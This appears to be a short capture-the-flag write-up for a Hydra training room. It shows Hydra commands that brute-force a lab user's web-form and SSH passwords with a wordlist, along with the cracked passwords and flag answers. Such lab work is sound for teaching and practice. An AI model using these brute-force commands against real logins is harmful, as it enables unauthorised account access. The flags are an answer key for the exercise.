# Hydra
Learn about and use Hydra, a fast network logon cracker, to bruteforce and obtain a website's credentials.

## [Task 1] Hydra Introduction
```
No answer needed
```



## [Task 2] Using Hydra

### Use Hydra to bruteforce molly's web password. What is flag 1?
```
$ hydra -l molly -P /opt/wordlists/rockyou.txt 10.10.217.206  http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V

[80][http-post-form] host: 10.10.217.206   login: molly   password: sunshine

THM{2673a7dd116de68e85c48ec0b1f2612e}
```

### Use Hydra to bruteforce molly's SSH password. What is flag 2?
```
$ hydra -l molly -P /opt/wordlists/rockyou.txt 10.10.217.206 -t 4 ssh

[22][ssh] host: 10.10.217.206   login: molly   password: butterfly

THM{c8eeb0468febbadea859baeb33b2541b}
```

